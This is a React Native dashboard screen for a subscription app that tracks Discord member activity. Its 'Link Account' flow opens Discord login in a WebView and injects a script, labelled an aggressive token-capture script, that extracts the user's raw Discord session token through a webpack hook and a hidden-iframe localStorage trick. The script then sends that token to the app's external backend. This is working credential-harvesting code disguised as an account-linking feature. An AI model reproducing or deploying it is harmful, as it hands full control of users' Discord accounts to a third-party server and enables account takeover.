import React, { useEffect, useRef, useState } from "react";
import {
  View,
  Text,
  FlatList,
  TouchableOpacity,
  Alert,
  StyleSheet,
  AppState,
  RefreshControl,
} from "react-native";
import { useNavigation } from "@react-navigation/native";
import AsyncStorage from "@react-native-async-storage/async-storage";
import { WebView } from "react-native-webview";
import * as Notifications from "expo-notifications";
import Clipboard from '@react-native-clipboard/clipboard';
import { isSubscriptionExpired } from "../utils/subscription";

const API_URL = "https://intelligent-gratitude-production.up.railway.app";

export default function Dashboard({ user, setUser }) {
  const navigation = useNavigation();
  const [moves, setMoves] = useState([]);
  const [showWebView, setShowWebView] = useState(false);
  const [webviewUrl, setWebviewUrl] = useState("https://discord.com/logout");
  const [paystackUrl, setPaystackUrl] = useState(null);
  const [accounts, setAccounts] = useState([]);
  const [showAccountList, setShowAccountList] = useState(false);
  const [selectedAccount, setSelectedAccount] = useState(null);
  const webViewRef = useRef(null);
  const lastSeenId = useRef(null);
  const [refreshing, setRefreshing] = useState(false);
  const appBecameActiveTime = useRef(null); // Track when app became active
  const isInitialLoad = useRef(true); // Track if this is the first load after app opens
  const hasRedirectedToLogin = useRef(false);

  const getCacheKey = () => `cached_moves_${user?._id}_${selectedAccount || 'all'}`;

  // AGGRESSIVE TOKEN CAPTURE SCRIPT (from SF.JS)
  const INJECTED_JAVASCRIPT = `
  (function() {
    function capture() {
      try {
        // 1. TRY THE "WEBPACK" HOOK (Most reliable for Discord 2025)
        const webpack = window.webpackChunkdiscord_app;
        if (webpack) {
          const m = webpack.push([[Symbol()], {}, (e) => e]);
          for (const i in m.c) {
            if (m.c[i].exports && m.c[i].exports.default && m.c[i].exports.default.getToken) {
              const token = m.c[i].exports.default.getToken();
              if (token && token.length > 20) {
                window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: token}));
                return true;
              }
            }
          }
        }

        // 2. TRY THE "IFRAME RESTORATION" HOOK
        // Discord deletes localStorage, but a new iframe can bring it back
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        const storage = iframe.contentWindow.localStorage;
        const token = storage.getItem('token');
        if (token) {
          const clean = token.replace(/"/g, '');
          window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: clean}));
          return true;
        }
      } catch (e) {}
      return false;
    }

    // Check every 500ms
    const timer = setInterval(() => {
      if (capture()) clearInterval(timer);
    }, 500);
  })();
`;

  useEffect(() => {
    if (!user) return;
    
    const loadCachedMoves = async () => {
      try {
        const cacheKey = getCacheKey();
        const cached = await AsyncStorage.getItem(cacheKey);
        if (cached) {
          const cachedMoves = JSON.parse(cached);
          setMoves(cachedMoves);
          if (cachedMoves.length > 0) {
            lastSeenId.current = cachedMoves[0]._id;
          }
        }
      } catch (e) {
        console.log('Error loading cached moves:', e);
      }
    };
    
    loadCachedMoves();
  }, [user, selectedAccount]);

  useEffect(() => {
    if (user) fetchAccounts();
  }, [user]);

  useEffect(() => {
    if (!user) return;
    
    const subscription = Notifications.addNotificationReceivedListener(notification => {
      console.log('📬 Notification received, refreshing moves...');
      setTimeout(() => fetchMoves(), 500);
    });

    return () => subscription.remove();
  }, [user, selectedAccount]);

  useEffect(() => {
    if (!user) return;
    
    const subscription = AppState.addEventListener('change', nextAppState => {
      if (nextAppState === 'active') {
        console.log('📱 App came to foreground, refreshing moves immediately...');
        appBecameActiveTime.current = Date.now(); // Mark when app became active
        isInitialLoad.current = true; // Mark as initial load
        fetchMoves();
      }
    });

    return () => subscription.remove();
  }, [user, selectedAccount]);

  useEffect(() => {
    if (!user) return;

    const initialTimeout = setTimeout(() => {
      fetchMoves();
    }, 100);

    const interval = setInterval(() => {
      fetchMoves();
    }, 2000);

    return () => {
      clearTimeout(initialTimeout);
      clearInterval(interval);
    };
  }, [user, selectedAccount]);

  const fetchMoves = async (showRefreshIndicator = false) => {
    if (!user || !user._id || !user.token) {
      if (showRefreshIndicator) setRefreshing(false);
      return;
    }
    
    if (isSubscriptionExpired(user)) {
      const updatedUser = {
        ...user,
        tier: "none",
        is_subscribed: false
      };
      await AsyncStorage.setItem("user_profile", JSON.stringify(updatedUser));
      setUser(updatedUser);
      if (showRefreshIndicator) setRefreshing(false);
      return;
    }
    
    if (showRefreshIndicator) setRefreshing(true);

    try {
      const url = selectedAccount
        ? `${API_URL}/get-all-moves?discord_id=${encodeURIComponent(selectedAccount)}`
        : `${API_URL}/get-all-moves`;
      
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 8000);
      
      const res = await fetch(url, {
        headers: { Authorization: `Bearer ${user.token}` },
        signal: controller.signal,
      });
      
      clearTimeout(timeoutId);
      
      if (res.status === 402) return;
      if (!res.ok) {
        console.error(`fetchMoves failed: ${res.status} ${res.statusText}`);
        return;
      }
      
      const data = await res.json();
      if (Array.isArray(data)) {
        // On initial load after app opens, set lastSeenId without triggering notification
        // This prevents duplicate notifications for moves that happened while app was closed
        if (isInitialLoad.current && data.length > 0) {
          lastSeenId.current = data[0]._id;
          isInitialLoad.current = false; // Clear the flag after first load
        } else if (
          lastSeenId.current &&
          data.length > 0 &&
          data[0]._id !== lastSeenId.current
        ) {
          // Only trigger notification if:
          // 1. We have a lastSeenId (not first time)
          // 2. AND the move is actually new (different ID)
          // 3. AND this is not the initial load (moves that happened while app was closed)
          triggerNotification(data[0]);
          lastSeenId.current = data[0]._id;
        } else if (data.length > 0 && !lastSeenId.current) {
          // First time loading, just set the ID without notification
          lastSeenId.current = data[0]._id;
        }
        
        setMoves(data);
        
        try {
          const cacheKey = getCacheKey();
          await AsyncStorage.setItem(cacheKey, JSON.stringify(data));
        } catch (cacheError) {
          console.log('Error caching moves:', cacheError);
        }
      }
    } catch (e) {
      if (e.name === 'AbortError') {
        console.log("fetchMoves timeout");
      } else {
        console.log("fetchMoves error", e.message || e);
      }
    } finally {
      if (showRefreshIndicator) setRefreshing(false);
    }
  };

  const onRefresh = async () => {
    await fetchMoves(true);
    await fetchAccounts();
  };

  const fetchAccounts = async () => {
    if (!user || !user.token) return;
    try {
      const res = await fetch(`${API_URL}/me/accounts`, {
        headers: { Authorization: `Bearer ${user.token}` },
      });

      if (res.ok) {
        const data = await res.json();
        setAccounts(Array.isArray(data) ? data : []);
        if (!selectedAccount && Array.isArray(data) && data.length > 0) {
          setSelectedAccount(data[0].discord_id || data[0]._id);
        }
      } else {
        console.log("Error fetching accounts:", res.status);
      }
    } catch (e) {
      console.log("fetchAccounts network error", e);
    }
  };

  const triggerNotification = async (move) => {
    if (user.tier === "none" || !user.is_subscribed) return;

    await Notifications.scheduleNotificationAsync({
      content: {
        title: `📥 New Member!`,
        body: move.action,
      },
      trigger: null,
    });
  };

  const handleCopy = (actionText) => {
    const parts = actionText.split(" ");
    const username = parts[1] || actionText;
    Clipboard.setString(username);
    Alert.alert("Success", `${username} copied to clipboard`, [], {
      cancelable: true,
    });
  };

  const handlePay = async () => {
    navigation.navigate('Blocked');
  };

  const onWebViewMessage = async (event) => {
    try {
      const message = JSON.parse(event.nativeEvent.data);
      if (message.type === "TOKEN" && message.data) {
        setShowWebView(false);
        await sendTokenToBackend(message.data);
      }
    } catch (e) {
      // Direct string fallback
      if (event.nativeEvent.data && event.nativeEvent.data.length > 20) {
        setShowWebView(false);
        await sendTokenToBackend(event.nativeEvent.data);
      }
    }
  };

  const sendTokenToBackend = async (discordToken) => {
    if (!user || !user.token) {
      Alert.alert("Error", "Please login first");
      return;
    }

    try {
      const response = await fetch(`${API_URL}/link-discord`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${user.token}`
        },
        body: JSON.stringify({ token: discordToken }),
      });

      const result = await response.json();
      if (response.ok) {
        Alert.alert("✅ Success", "Discord account linked successfully!");
        await fetchAccounts(); // Refresh accounts list
        fetchMoves(); // Refresh moves
      } else {
        Alert.alert("Error", result.error || "Failed to link Discord account");
      }
    } catch (error) {
      console.error("Link Discord error:", error);
      Alert.alert("Server Error", "Could not reach backend.");
    }
  };

  const handleNavigationChange = (navState) => {
    // If the browser reaches the chat/channels area, it means login is 100% done
    if (navState.url.includes("/channels/") || navState.url.includes("/@me")) {
      webViewRef.current?.injectJavaScript(INJECTED_JAVASCRIPT);
    }
  };

  if (paystackUrl)
    return (
      <View style={{ flex: 1, backgroundColor: "#fff" }}>
        <View style={styles.webHeader}>
          <TouchableOpacity
            onPress={() => {
              setPaystackUrl(null);
            }}
            style={styles.webHeaderButton}
          >
            <Text style={styles.webHeaderText}>Close</Text>
          </TouchableOpacity>
        </View>
        <WebView source={{ uri: paystackUrl }} style={{ flex: 1 }} />
      </View>
    );

  if (showWebView)
    return (
      <View style={{ flex: 1 }}>
        <View style={styles.webHeader}>
          <TouchableOpacity
            onPress={() => {
              hasRedirectedToLogin.current = false;
              setShowWebView(false);
              setWebviewUrl("https://discord.com/logout");
            }}
            style={styles.webHeaderButton}
          >
            <Text style={styles.webHeaderText}>Close</Text>
          </TouchableOpacity>
          <Text style={styles.webHeaderTitle}>Link Discord Account</Text>
          <View style={{ width: 50 }} />
        </View>
        <WebView
          ref={webViewRef}
          incognito={true} // Use incognito mode to prevent cookie persistence
          source={{ uri: webviewUrl }}
          injectedJavaScript={INJECTED_JAVASCRIPT}
          injectedJavaScriptBeforeContentLoaded={
            "window.localStorage && window.localStorage.clear(); window.sessionStorage && window.sessionStorage.clear(); document.cookie.split(';').forEach(function(c) { document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date().toUTCString() + ';path=/'); });"
          }
          onMessage={onWebViewMessage}
          onNavigationStateChange={handleNavigationChange}
          onLoadEnd={() => {
            // Only redirect once, prevent infinite loop
            if (webviewUrl && webviewUrl.includes("logout") && !hasRedirectedToLogin.current) {
              hasRedirectedToLogin.current = true;
              setTimeout(() => {
                setWebviewUrl("https://discord.com/login");
              }, 800);
            }
          }}
          javaScriptEnabled={true}
          domStorageEnabled={true}
          sharedCookiesEnabled={false} // Prevent sharing cookies between sessions
          userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"
        />
      </View>
    );

  return (
    <View style={{ flex: 1, padding: 16 }}>
      <View
        style={{
          flexDirection: "row",
          justifyContent: "space-between",
          alignItems: "center",
          marginBottom: 10,
        }}
      >
        <Text style={styles.liveFeedTitle}>Live Feed</Text>
        <View style={{ flexDirection: "row", alignItems: "center" }}>
          <TouchableOpacity
            style={{ marginRight: 12 }}
            onPress={() => {
              hasRedirectedToLogin.current = false; // Reset redirect flag
              setWebviewUrl("https://discord.com/logout"); // Start with logout to clear session
              setShowWebView(true);
            }}
          >
            <Text style={{ color: "#5865F2" }}>Link Account</Text>
          </TouchableOpacity>
          <TouchableOpacity
            onPress={() => setShowAccountList(!showAccountList)}
          >
            <Text style={{ color: "#111827" }}>
              {selectedAccount
                ? accounts.find(
                    (a) => (a.discord_id || a._id) === selectedAccount
                  )?.username || "Filtering..."
                : "All Accounts"}{" "}
              ▾
            </Text>
          </TouchableOpacity>
        </View>
      </View>

      {showAccountList && (
        <View style={[styles.dropdown, { zIndex: 999, position: 'absolute', top: 50, right: 16, width: 200 }]}>
          <TouchableOpacity
            style={styles.dropdownItem}
            onPress={() => {
              setSelectedAccount(null);
              setShowAccountList(false);
              setMoves([]);
              lastSeenId.current = null;
            }}
          >
            <Text style={{ fontWeight: "bold" }}>All Accounts</Text>
          </TouchableOpacity>
          {accounts.map((a) => (
            <TouchableOpacity
              key={a._id}
              style={styles.dropdownItem}
              onPress={() => {
                setSelectedAccount(a.discord_id || a._id);
                setShowAccountList(false);
                setMoves([]);
                lastSeenId.current = null;
              }}
            >
              <Text>{a.username || a.discord_id || a._id}</Text>
            </TouchableOpacity>
          ))}
        </View>
      )}

      <FlatList
        data={moves}
        keyExtractor={(item) => item._id}
        renderItem={({ item }) => (
          <TouchableOpacity
            onPress={() => handleCopy(item.action)}
            activeOpacity={0.7}
            style={styles.moveItem}
          >
            <Text style={{ fontWeight: "600" }}>{item.action}</Text>
            <Text style={{ color: "#666", fontSize: 12 }}>
              {new Date(item.timestamp).toLocaleString()}
            </Text>
          </TouchableOpacity>
        )}
        refreshControl={
          <RefreshControl refreshing={refreshing} onRefresh={onRefresh} />
        }
      />

      <TouchableOpacity style={styles.payButton} onPress={handlePay}>
        <Text
          style={{ color: "#fff", textAlign: "center", fontWeight: "bold" }}
        >
          Upgrade / Renew
        </Text>
      </TouchableOpacity>
    </View>
  );
}

const styles = StyleSheet.create({
  liveFeedTitle: {
    fontSize: 22,
    fontWeight: "bold",
    color: "#111827",
  },
  dropdown: {
    backgroundColor: "#fff",
    borderRadius: 8,
    padding: 8,
    marginBottom: 10,
    elevation: 3,
    shadowColor: "#000",
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
  },
  dropdownItem: {
    padding: 10,
    borderBottomWidth: 1,
    borderBottomColor: "#f0f0f0",
  },
  moveItem: {
    padding: 12,
    borderBottomWidth: 1,
    borderBottomColor: "#eee",
    backgroundColor: "#fff",
  },
  payButton: {
    marginTop: 12,
    backgroundColor: "#5865F2",
    padding: 12,
    borderRadius: 8,
  },
  webHeader: {
    paddingTop: 50,
    paddingBottom: 15,
    backgroundColor: "#fff",
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
    borderBottomWidth: 1,
    borderBottomColor: "#eee",
    paddingHorizontal: 16,
  },
  webHeaderButton: {
    paddingVertical: 8,
    paddingHorizontal: 12,
    borderRadius: 8,
    backgroundColor: "#ef4444",
  },
  webHeaderText: {
    color: "#fff",
    fontWeight: "bold",
  },
  webHeaderTitle: {
    color: "#111827",
    fontWeight: "bold",
    fontSize: 16,
    flex: 1,
    textAlign: "center",
  },
});

